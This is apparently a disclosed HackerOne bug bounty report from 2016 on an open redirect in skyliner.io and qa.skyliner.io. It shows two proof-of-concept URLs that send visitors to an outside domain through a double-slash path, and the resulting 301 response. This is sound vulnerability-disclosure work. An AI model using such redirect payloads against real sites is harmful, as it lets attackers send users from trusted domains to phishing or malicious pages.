# [skyliner.io / qa.skyliner.io] Open Redirect

## Report Details
- **Report ID**: 163124
- **URL**: https://hackerone.com/reports/163124
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2016-08-24T17:32:29.977Z
- **Disclosed**: 2016-09-29T17:24:12.757Z

## Reporter
- **Username**: bobrov
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: skyliner

## Vulnerability Information
**PoC**
```
https://skyliner.io//blackfan.ru/
https://qa.skyliner.io//blackfan.ru/
```

**HTTP Response**
```
HTTP/1.1 301 Moved Permanently
Content-Length: 0
Connection: close
Date: Wed, 24 Aug 2016 17:30:39 GMT
Location: //blackfan.ru
```

https://cwe.mitre.org/data/definitions/601.html

## Attachments
No attachments
